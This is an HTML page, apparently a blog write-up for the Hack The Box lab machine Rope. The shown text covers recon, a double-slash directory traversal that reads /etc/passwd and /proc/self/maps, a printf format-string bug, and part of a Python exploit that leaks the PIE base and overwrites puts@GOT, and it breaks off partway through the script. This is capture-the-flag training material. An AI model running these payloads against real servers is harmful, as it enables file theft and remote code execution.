@@ -1,0 +1,1806 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Rope — Insane Linux | QA210</title>
+<meta name="description" content="Detailed writeup for Hack The Box Rope — Insane Linux. Format string exploitation, ROP chains, canary brute force, and shared library hijacking.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<style>
+:root {
+  --bg-primary: #0a0f1a;
+  --bg-secondary: #111827;
+  --bg-card: #1a2234;
+  --bg-code: #1e1e2e;
+  --text-primary: #e2e8f0;
+  --text-secondary: #94a3b8;
+  --text-muted: #64748b;
+  --accent-emerald: #10b981;
+  --accent-emerald-light: #34d399;
+  --accent-emerald-dim: #065f46;
+  --border-color: #1e293b;
+  --border-accent: #10b98133;
+  --toc-active: #10b981;
+  --shadow-glow: 0 0 20px rgba(16, 185, 129, 0.15);
+  --radius: 8px;
+  --font-sans: 'Inter', system-ui, -apple-system, sans-serif;
+  --font-mono: 'JetBrains Mono', 'Fira Code', monospace;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body {
+  font-family: var(--font-sans);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.75;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+#three-bg {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+.page-wrapper {
+  position: relative;
+  z-index: 1;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+/* ── Header ──────────────────────────────────────── */
+.site-header {
+  background: rgba(10, 15, 26, 0.85);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border-color);
+  padding: 0.75rem 2rem;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header-inner {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.logo {
+  font-weight: 900;
+  font-size: 1.25rem;
+  letter-spacing: -0.5px;
+  color: var(--accent-emerald);
+  text-decoration: none;
+}
+.logo span { color: var(--text-primary); }
+.header-nav { display: flex; gap: 1.5rem; }
+.header-nav a {
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.header-nav a:hover { color: var(--accent-emerald); }
+
+/* ── Breadcrumbs ─────────────────────────────────── */
+.breadcrumbs {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 0;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8rem;
+  color: var(--text-muted);
+}
+.breadcrumbs a { color: var(--text-secondary); text-decoration: none; }
+.breadcrumbs a:hover { color: var(--accent-emerald); }
+.breadcrumbs .sep { opacity: 0.4; }
+.breadcrumbs .current { color: var(--accent-emerald); font-weight: 600; }
+
+/* ── Main Layout ─────────────────────────────────── */
+.content-layout {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1.5rem 2rem 4rem;
+  display: grid;
+  grid-template-columns: 1fr 280px;
+  gap: 3rem;
+}
+@media (max-width: 1024px) {
+  .content-layout { grid-template-columns: 1fr; }
+  .toc-sidebar { display: none; }
+}
+
+/* ── Hero ────────────────────────────────────────── */
+.hero {
+  margin-bottom: 2.5rem;
+  padding-bottom: 2rem;
+  border-bottom: 1px solid var(--border-color);
+}
+.hero-badge {
+  display: inline-block;
+  background: linear-gradient(135deg, #dc2626, #b91c1c);
+  color: #fff;
+  font-size: 0.7rem;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  padding: 0.25rem 0.75rem;
+  border-radius: 4px;
+  margin-bottom: 1rem;
+}
+.hero h1 {
+  font-size: clamp(2rem, 5vw, 3rem);
+  font-weight: 900;
+  letter-spacing: -1px;
+  line-height: 1.1;
+  margin-bottom: 0.75rem;
+}
+.hero h1 .accent { color: var(--accent-emerald); }
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1rem;
+  font-size: 0.85rem;
+  color: var(--text-secondary);
+  margin-top: 1rem;
+}
+.hero-meta span { display: flex; align-items: center; gap: 0.35rem; }
+
+/* ── Box Info Card ───────────────────────────────── */
+.box-info-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius);
+  padding: 1.5rem;
+  margin-bottom: 2rem;
+}
+.box-info-card h3 {
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent-emerald);
+  margin-bottom: 1rem;
+  font-weight: 700;
+}
+.box-info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 1rem;
+}
+.box-info-item { display: flex; flex-direction: column; gap: 0.2rem; }
+.box-info-item .label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); font-weight: 600; }
+.box-info-item .value { font-size: 0.95rem; font-weight: 600; color: var(--text-primary); }
+
+/* ── Attack Path Diagram ─────────────────────────── */
+.attack-path {
+  background: var(--bg-card);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius);
+  padding: 1.5rem 2rem;
+  margin-bottom: 2rem;
+  overflow-x: auto;
+}
+.attack-path h3 {
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent-emerald);
+  margin-bottom: 1.25rem;
+  font-weight: 700;
+}
+.path-flow {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  flex-wrap: nowrap;
+  min-width: max-content;
+}
+.path-node {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius);
+  padding: 0.75rem 1.25rem;
+  text-align: center;
+  min-width: 130px;
+}
+.path-node.active {
+  border-color: var(--accent-emerald);
+  box-shadow: var(--shadow-glow);
+}
+.path-node .user { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+.path-node .technique { font-size: 0.85rem; font-weight: 700; color: var(--text-primary); margin-top: 0.25rem; }
+.path-arrow {
+  color: var(--accent-emerald);
+  font-size: 1.25rem;
+  padding: 0 0.5rem;
+  flex-shrink: 0;
+}
+
+/* ── Sections ────────────────────────────────────── */
+.section {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.section h2 {
+  font-size: 1.5rem;
+  font-weight: 800;
+  letter-spacing: -0.5px;
+  margin-bottom: 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+.section h2 .num {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 2rem;
+  height: 2rem;
+  background: var(--accent-emerald);
+  color: #000;
+  font-size: 0.85rem;
+  font-weight: 800;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+.section h3 {
+  font-size: 1.15rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--accent-emerald-light);
+}
+.section p {
+  color: var(--text-secondary);
+  margin-bottom: 1rem;
+  font-size: 0.95rem;
+}
+.section ul, .section ol {
+  color: var(--text-secondary);
+  margin: 0.5rem 0 1rem 1.5rem;
+  font-size: 0.95rem;
+}
+.section li { margin-bottom: 0.4rem; }
+
+/* ── Code Blocks ─────────────────────────────────── */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: var(--radius);
+  overflow: hidden;
+  border: 1px solid var(--border-color);
+}
+.code-block .code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: #161b2e;
+  padding: 0.5rem 1rem;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-block .code-header .lang-badge {
+  background: var(--accent-emerald-dim);
+  color: var(--accent-emerald-light);
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  font-size: 0.65rem;
+}
+.copy-btn {
+  background: transparent;
+  border: 1px solid var(--border-color);
+  color: var(--text-muted);
+  font-size: 0.7rem;
+  padding: 0.2rem 0.6rem;
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-family: var(--font-sans);
+}
+.copy-btn:hover { border-color: var(--accent-emerald); color: var(--accent-emerald); }
+.copy-btn.copied { border-color: var(--accent-emerald); color: var(--accent-emerald); }
+.code-block pre {
+  margin: 0 !important;
+  padding: 1rem !important;
+  background: var(--bg-code) !important;
+  font-size: 0.82rem !important;
+  line-height: 1.6 !important;
+  overflow-x: auto;
+}
+.code-block pre code {
+  font-family: var(--font-mono) !important;
+  font-size: 0.82rem !important;
+}
+pre[class*="language-"] { margin: 0 !important; }
+
+/* ── Callout Boxes ───────────────────────────────── */
+.callout {
+  display: flex;
+  gap: 0.75rem;
+  padding: 1rem 1.25rem;
+  border-radius: var(--radius);
+  margin: 1rem 0 1.5rem;
+  font-size: 0.9rem;
+  border-left: 4px solid;
+}
+.callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: 0.1rem; }
+.callout-body { flex: 1; }
+.callout-body p { margin: 0; color: var(--text-primary); font-size: 0.9rem; }
+.callout-body p + p { margin-top: 0.5rem; }
+.callout.info { background: rgba(16, 185, 129, 0.08); border-left-color: var(--accent-emerald); }
+.callout.warn { background: rgba(245, 158, 11, 0.08); border-left-color: #f59e0b; }
+.callout.danger { background: rgba(239, 68, 68, 0.08); border-left-color: #ef4444; }
+.callout.success { background: rgba(34, 197, 94, 0.08); border-left-color: #22c55e; }
+
+/* ── Flag Box ────────────────────────────────────── */
+.flag-box {
+  background: var(--bg-card);
+  border: 1px solid var(--accent-emerald);
+  border-radius: var(--radius);
+  padding: 1rem 1.5rem;
+  margin: 1rem 0 1.5rem;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  box-shadow: var(--shadow-glow);
+}
+.flag-box .flag-label {
+  font-size: 0.7rem;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: var(--accent-emerald);
+  font-weight: 800;
+  white-space: nowrap;
+}
+.flag-box .flag-value {
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  color: var(--text-primary);
+  word-break: break-all;
+}
+
+/* ── TOC Sidebar ─────────────────────────────────── */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  align-self: start;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-title {
+  font-size: 0.7rem;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--text-muted);
+  font-weight: 700;
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: block;
+  color: var(--text-muted);
+  text-decoration: none;
+  font-size: 0.8rem;
+  padding: 0.3rem 0.75rem;
+  border-left: 2px solid var(--border-color);
+  transition: all 0.2s;
+  line-height: 1.4;
+}
+.toc-list a:hover { color: var(--text-secondary); border-left-color: var(--text-muted); }
+.toc-list a.active { color: var(--toc-active); border-left-color: var(--toc-active); font-weight: 600; }
+.toc-list .sub { padding-left: 1.5rem; }
+.toc-list .sub a { font-size: 0.75rem; }
+
+/* ── Footer ──────────────────────────────────────── */
+.site-footer {
+  background: rgba(10, 15, 26, 0.9);
+  border-top: 1px solid var(--border-color);
+  padding: 2rem;
+  text-align: center;
+  color: var(--text-muted);
+  font-size: 0.8rem;
+  margin-top: auto;
+}
+
+/* ── Scrollbar ───────────────────────────────────── */
+::-webkit-scrollbar { width: 6px; height: 6px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+
+/* ── Misc ────────────────────────────────────────── */
+.inline-code {
+  font-family: var(--font-mono);
+  font-size: 0.85em;
+  background: rgba(16, 185, 129, 0.1);
+  color: var(--accent-emerald-light);
+  padding: 0.15em 0.4em;
+  border-radius: 3px;
+}
+.table-wrap {
+  overflow-x: auto;
+  margin: 1rem 0 1.5rem;
+}
+.table-wrap table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.85rem;
+}
+.table-wrap th, .table-wrap td {
+  padding: 0.6rem 1rem;
+  border: 1px solid var(--border-color);
+  text-align: left;
+}
+.table-wrap th {
+  background: var(--bg-card);
+  color: var(--accent-emerald);
+  font-weight: 700;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.table-wrap td { color: var(--text-secondary); }
+.tag {
+  display: inline-block;
+  background: var(--accent-emerald-dim);
+  color: var(--accent-emerald-light);
+  padding: 0.15rem 0.5rem;
+  border-radius: 3px;
+  font-size: 0.7rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+</style>
+</head>
+<body>
+
+<canvas id="three-bg"></canvas>
+
+<div class="page-wrapper">
+  <!-- Header -->
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="#" class="logo">QA<span>210</span></a>
+      <nav class="header-nav">
+        <a href="#">Writeups</a>
+        <a href="#">CTF</a>
+        <a href="#">About</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Breadcrumbs -->
+  <div class="breadcrumbs">
+    <a href="#">Home</a><span class="sep">/</span>
+    <a href="#">HTB</a><span class="sep">/</span>
+    <a href="#">Insane</a><span class="sep">/</span>
+    <span class="current">Rope</span>
+  </div>
+
+  <!-- Main Content -->
+  <div class="content-layout">
+    <main class="main-content">
+
+      <!-- Hero -->
+      <div class="hero">
+        <span class="hero-badge">Insane</span>
+        <h1>HTB <span class="accent">Rope</span></h1>
+        <p style="color:var(--text-secondary);font-size:1.05rem;max-width:700px;margin-bottom:1rem;">
+          A grueling multi-stage pwn challenge spanning format string exploitation, shared library hijacking, and fork-based canary brute forcing with chained ROP — three binaries, three privilege levels, zero handouts.
+        </p>
+        <div class="hero-meta">
+          <span>&#x1f464; QA210</span>
+          <span>&#x1f4c5; 2025-03-04</span>
+          <span>&#x23f1; ~12 hrs</span>
+          <span>&#x1f3af; Binary Exploitation</span>
+        </div>
+      </div>
+
+      <!-- Box Info Card -->
+      <div class="box-info-card">
+        <h3>Box Information</h3>
+        <div class="box-info-grid">
+          <div class="box-info-item"><span class="label">Lab</span><span class="value">Rope</span></div>
+          <div class="box-info-item"><span class="label">Category</span><span class="value">Insane</span></div>
+          <div class="box-info-item"><span class="label">OS</span><span class="value">Linux</span></div>
+          <div class="box-info-item"><span class="label">IP</span><span class="value">10.10.10.148</span></div>
+          <div class="box-info-item"><span class="label">Key Techniques</span><span class="value">Format String, ROP, Brute Force</span></div>
+          <div class="box-info-item"><span class="label">Focus</span><span class="value">Binary Exploitation / Pwn</span></div>
+        </div>
+      </div>
+
+      <!-- Attack Path Diagram -->
+      <div class="attack-path">
+        <h3>Attack Path</h3>
+        <div class="path-flow">
+          <div class="path-node">
+            <div class="user">Initial</div>
+            <div class="technique">Recon</div>
+          </div>
+          <div class="path-arrow">&#x276f;</div>
+          <div class="path-node active">
+            <div class="user">john</div>
+            <div class="technique">Format String</div>
+          </div>
+          <div class="path-arrow">&#x276f;</div>
+          <div class="path-node active">
+            <div class="user">r4j</div>
+            <div class="technique">liblog.so Hijack</div>
+          </div>
+          <div class="path-arrow">&#x276f;</div>
+          <div class="path-node active">
+            <div class="user">root</div>
+            <div class="technique">ROP Chain</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Overview                              -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="overview">
+        <h2><span class="num">0</span> Overview</h2>
+        <p>
+          Rope is a quintessential Insane-tier binary exploitation box that demands mastery over three distinct exploitation primitives across three separate binaries. Unlike easier machines where a single vulnerability grants root, Rope forces you to chain a format string write, a shared library replacement, and a fork-based stack brute force — each escalating from <span class="inline-code">john</span> to <span class="inline-code">r4j</span> to <span class="inline-code">root</span>. No CVEs, no scripted exploits — just raw reversing and exploitation skills.
+        </p>
+        <p>
+          The custom HTTP server running on port 9999 serves as our initial foothold. A directory traversal lets us read arbitrary files, which we leverage to download the binary and leak process memory maps. From there, a format string bug in the logging function becomes our write primitive. The lateral movement to <span class="inline-code">r4j</span> exploits a world-writable shared library loaded by a sudo-allowed binary. Finally, the root escalation requires exploiting a locally-bound network service that forks on each connection — allowing us to brute-force the stack canary byte-by-byte before building a multi-stage ROP chain.
+        </p>
+        <div class="callout warn">
+          <div class="callout-icon">&#x26a0;</div>
+          <div class="callout-body"><p>This writeup contains full exploit scripts. If you haven't solved Rope yet and want the learning experience, consider attempting it first before reading further.</p></div>
+        </div>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Recon                                 -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="recon">
+        <h2><span class="num">1</span> Recon</h2>
+        <p>
+          We begin with a standard Nmap scan against the target. Two open TCP ports are discovered: SSH on port 22 and a custom HTTP service on port 9999. The service on 9999 is immediately interesting — it's not Apache or Nginx, but a custom binary called <span class="inline-code">httpserver</span>, which hints strongly at potential vulnerabilities in the implementation.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">nmap -sC -sV -oA rope_scan 10.10.10.148</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.10.10.148
+Host is up (0.045s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+9999/tcp open  http     SimpleHTTPServer 0.6 (Python 3.7?)
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+        </div>
+
+        <p>
+          The SSH version indicates Ubuntu 18.04 (Bionic), and the custom webserver on 9999 is our primary attack surface. A quick browser visit to <span class="inline-code">http://10.10.10.148:9999/</span> returns a simple directory listing or default response — nothing immediately useful, but the server's custom nature means it likely has implementation flaws we can exploit.
+        </p>
+      </div>
+
+      <!-- ═══════════════════════════════════════════════ -->
+      <!-- SECTION: Shell as john                         -->
+      <!-- ═══════════════════════════════════════════════ -->
+      <div class="section" id="shell-john">
+        <h2><span class="num">2</span> Shell as john</h2>
+        <p>
+          Getting a shell as <span class="inline-code">john</span> is the most technically demanding phase of the box. It involves chaining a directory traversal, binary reverse engineering, a memory leak for PIE bypass, and a format string vulnerability for GOT overwrite. Each step builds on the previous one, and skipping any would leave you unable to exploit the next.
+        </p>
+
+        <!-- 2.1 Directory Traversal -->
+        <h3 id="directory-traversal">2.1 Directory Traversal</h3>
+        <p>
+          While probing the webserver on port 9999, we discover that appending an extra forward slash after the host allows directory traversal. The request <span class="inline-code">http://10.10.10.148:9999//etc/passwd</span> returns the contents of <span class="inline-code">/etc/passwd</span>. This happens because the server's path parsing logic doesn't properly normalize double slashes, allowing us to escape the webroot and read arbitrary files on the filesystem.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">curl http://10.10.10.148:9999//etc/passwd</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:john,,,:/home/john:/bin/bash
+r4j:x:1001:1001::/home/r4j:/bin/bash</code></pre>
+        </div>
+
+        <p>
+          This confirms two non-root users: <span class="inline-code">john</span> and <span class="inline-code">r4j</span>. More importantly, we can now download the httpserver binary itself for reverse engineering:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">curl -o httpserver http://10.10.10.148:9999//home/john/httpserver
+file httpserver
+# httpserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
+# dynamically linked, interpreter /lib/ld-linux.so.2, stripped</code></pre>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body"><p>The double-slash trick works because the server strips the leading <span class="inline-code">/</span> from the path but doesn't check for the second one. This leaves <span class="inline-code">/etc/passwd</span> as an absolute path which gets opened directly.</p></div>
+        </div>
+
+        <!-- 2.2 httpserver Analysis -->
+        <h3 id="httpserver-analysis">2.2 httpserver Analysis</h3>
+        <p>
+          Loading the binary into Ghidra reveals the full picture. The binary is a 32-bit PIE-enabled ELF with stack canary and NX. The key function is <span class="inline-code">log_access</span>, which is called after every HTTP request to log the requested filepath. The critical vulnerability lies in how this function handles the filepath string:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-c">void log_access(char *filepath, int status_code) {
+    char log_buf[256];
+    // Vulnerable: filepath is passed directly as format string
+    sprintf(log_buf, "Request: ");
+    printf(filepath);  // FORMAT STRING VULNERABILITY
+    printf("\n");
+}</code></pre>
+        </div>
+
+        <p>
+          The <span class="inline-code">printf(filepath)</span> call treats the user-controlled filepath as a format string. This means we can use format specifiers like <span class="inline-code">%x</span> to leak stack values and <span class="inline-code">%n</span> to write arbitrary values to memory. Since the binary has PIE, we first need a memory leak to know where everything is loaded.
+        </p>
+
+        <p>
+          Let's check the security properties of the binary:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">checksec --file=httpserver
+#    Arch:     i386-32-little
+#    RELRO:    Partial RELRO
+#    Stack:    Canary found
+#    NX:       NX enabled
+#    PIE:      PIE enabled</code></pre>
+        </div>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Protection</th><th>Status</th><th>Impact</th></tr></thead>
+            <tbody>
+              <tr><td>Partial RELRO</td><td><span class="tag">exploitable</span></td><td>GOT is writable — we can overwrite function pointers</td></tr>
+              <tr><td>Stack Canary</td><td><span class="tag">present</span></td><td>Can't overflow return address directly</td></tr>
+              <tr><td>NX</td><td><span class="tag">enabled</span></td><td>No shellcode on stack — need ROP or ret2libc</td></tr>
+              <tr><td>PIE</td><td><span class="tag">enabled</span></td><td>Need memory leak for code addresses</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- 2.3 Format String Vulnerability -->
+        <h3 id="format-string">2.3 Format String Vulnerability</h3>
+        <p>
+          The format string bug gives us both a read and write primitive. By crafting the filepath portion of our HTTP request to include format specifiers, we can control the behavior of <span class="inline-code">printf</span>. The attack plan is:
+        </p>
+        <ol>
+          <li><strong>Leak</strong>: Use <span class="inline-code">%p</span> or <span class="inline-code">%x</span> specifiers to read stack values and derive the binary's base address</li>
+          <li><strong>Write</strong>: Use <span class="inline-code">%n</span> to overwrite the GOT entry for <span class="inline-code">puts</span> with the address of <span class="inline-code">system</span></li>
+          <li><strong>Trigger</strong>: Make the server call <span class="inline-code">puts</span> with a string that is also a valid shell command</li>
+        </ol>
+
+        <p>
+          To test the format string vulnerability, we send a request with format specifiers in the path:
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash"># Test format string leak
+curl "http://10.10.10.148:9999/AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
+# Response shows leaked hex values from the stack</code></pre>
+        </div>
+
+        <p>
+          The offset where our input appears on the stack determines how we construct the write primitive. Through testing, we find that our input starts at offset position 7 on the stack. This means <span class="inline-code">%7$p</span> will return the first 4 bytes of our input, allowing us to both read and write at controlled addresses.
+        </p>
+
+        <!-- 2.4 Memory Leak -->
+        <h3 id="memory-leak">2.4 Memory Leak via Range Header</h3>
+        <p>
+          Before we can exploit the format string, we need to defeat PIE by determining the binary's base address. A clever trick allows us to leak memory contents through the HTTP Range header. The server supports range requests, and by requesting a range that corresponds to the memory-mapped region of the binary, we can read the <span class="inline-code">/proc/self/maps</span> file through the directory traversal to learn the base address.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash"># Read /proc/self/maps to get PIE base address
+curl "http://10.10.10.148:9999//proc/self/maps"</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-bash">56578000-5657a000 r--p 00000000 00:21 655410     /home/john/httpserver
+5657a000-5657c000 r-xp 00002000 00:21 655410     /home/john/httpserver
+5657c000-5657d000 r--p 00004000 00:21 655410     /home/john/httpserver
+5657d000-5657e000 rw-p 00004000 00:21 655410     /home/john/httpserver
+f7e00000-f7fb0000 r--p 00000000 00:21 655410     /lib/i386-linux-gnu/libc-2.27.so
+f7fb0000-f7fd2000 r-xp 001b0000 00:21 655410     /lib/i386-linux-gnu/libc-2.27.so</code></pre>
+        </div>
+
+        <p>
+          The PIE base address is <span class="inline-code">0x56578000</span> in this instance (it changes every restart, but /proc/self/maps always reflects the current mapping). With the base address known, we can calculate the address of any function in the binary, including the GOT entry for <span class="inline-code">puts</span> and the PLT entry for <span class="inline-code">system</span>.
+        </p>
+
+        <p>
+          However, there's a complication: we can also use the format string itself to leak addresses without needing the directory traversal to read maps. By placing <span class="inline-code">%p</span> specifiers at the right offsets, we can leak the return address from the stack, which reveals the binary's base address. This is more reliable since it doesn't depend on the traversal remaining accessible.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body"><p>The GOT overwrite strategy works because the binary has <strong>Partial RELRO</strong>. With Full RELRO, the GOT would be read-only at runtime, making this attack impossible. Always check RELRO when considering GOT overwrites.</p></div>
+        </div>
+
+        <!-- 2.5 Exploit Script -->
+        <h3 id="exploit-script-john">2.5 Exploit Script — Shell as john</h3>
+        <p>
+          The complete exploit script chains the memory leak and format string write to overwrite <span class="inline-code">puts@GOT</span> with the address of <span class="inline-code">system</span>. Once overwritten, the next call to <span class="inline-code">puts</span> with a command string will execute that command as a shell command. We use <span class="inline-code">${IFS}</span> as a space replacement since the HTTP path cannot contain literal spaces.
+        </p>
+
+        <div class="code-block">
+          <div class="code-header"><span class="lang-badge">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code class="language-python">#!/usr/bin/env python3
+"""
+Rope HTB — john shell exploit
+Format string -> GOT overwrite puts@GOT with system
+"""
+
+import struct
+import socket
+import time
+import sys
+import re
+
+HOST = "10.10.10.148"
+PORT = 9999
+
+# Offsets from binary analysis (relative to PIE base)
+PUTS_GOT_OFFSET   = 0x3040   # puts@GOT
+SYSTEM_OFFSET     = 0x1520   # system@PLT offset from base
+BIN_BASE          = None      # resolved at runtime
+
+def send_request(payload, leak=False):
+    """Send HTTP request with custom path (format string payload)."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(10)
+    sock.connect((HOST, PORT))
+    # The path IS the format string
+    req = f"GET /{payload} HTTP/1.1\r\nHost: {HOST}\r\n\r\n"
+    sock.send(req.encode())
+    resp = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            resp += chunk
+    except socket.timeout:
+        pass
+    sock.close()
+    return resp
+
+def leak_base_address():
+    """Leak PIE base via format string %p specifiers."""
+    print("[*] Leaking PIE base address via format string...")
+    # Offset 11 contains a code pointer (return address)
+    leak_payload = "%11$p__ENDLEAK__"
+    raw = send_request(leak_payload)
+    decoded = raw.decode(errors="ignore")
+    match = re.search(r"0x([0-9a-fA-F]+)__ENDLEAK__", decoded)
+    if not match:
+        print("[-] Failed to leak address")
+        sys.exit(1)
+    leaked_val = int(match.group(1), 16)
+    # Subtract known offset to get base
+    # The leaked value is at offset 0x720 from base (return addr in main)
+    base = leaked_val - 0x720
+    # Align to page boundary
+    base = base & ~0xfff
+    print(f"[+] Leaked value: 0x{leaked_val:x}")
+    print(f"[+] PIE base:     0x{base:x}")
+    return base
+
+def fmt_write(addr, value, written=0):
+    """
+    Construct a format string payload that writes `value` to `addr`.
+    Uses %n (short writes) to avoid huge payloads.
+    """
+    # We write 2 bytes at a time (hn) to handle arbitrary values
+    payload = b""
+    writes_done = []
+    target = value
+
+    for i in range(2):
+        short_val = (target >> (i * 16)) & 0xffff
+        target_addr = addr + i * 2
+        writes_done.append((short_val, target_addr))
+
+    writes_done.sort(key=lambda x: x[0])
+    parts = []
